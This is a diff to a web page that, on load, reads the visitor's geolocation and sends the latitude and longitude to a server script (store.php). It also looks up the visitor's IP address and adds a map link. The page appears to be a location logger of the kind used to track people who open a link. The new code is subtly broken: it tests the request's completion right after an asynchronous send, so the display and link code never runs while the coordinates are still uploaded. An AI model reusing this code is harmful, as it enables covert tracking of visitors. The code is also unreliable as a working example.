@@ -25,6 +25,11 @@
             border-radius: 5px;
             width: 50%;
         }
+        a{
+          text-decoration: none;
+          color: white;
+          font-size: 18px;
+        }
     </style>
 </head>
 <body style="background-color: #111;" onload="getLocation()" id="body">
@@ -53,15 +58,20 @@
         }
         
         function showPosition(position) {
-        fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => document.getElementById("h1").innerHTML += "<br>IP : " + data.ip);
-        
-        const xhttp = new XMLHttpRequest();
-        xhttp.open("GET","save.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
-        xhttp.send();
+          const xhttp = new XMLHttpRequest();
+          xhttp.open("GET","store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+          xhttp.send();
+          console.log(xhttp.readyState);
+          if (xhttp.readyState == 4 && xhttp.status == 200){
+            fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => document.getElementById("h1").innerHTML += "<br>IP : " + data.ip);
+            
             x.innerHTML = "Latitude: " + position.coords.latitude + 
-          "<br>Longitude: " + position.coords.longitude;
+            "<br>Longitude: " + position.coords.longitude;
+            var link = "https://www.latlong.net/c/?lat="+position.coords.latitude+"&long="+position.coords.longitude;
+            document.querySelector(".countener").innerHTML += `<a href="${link}" target="_blank">clickmy</a>`
+          }
         }
         </script>
 </body>
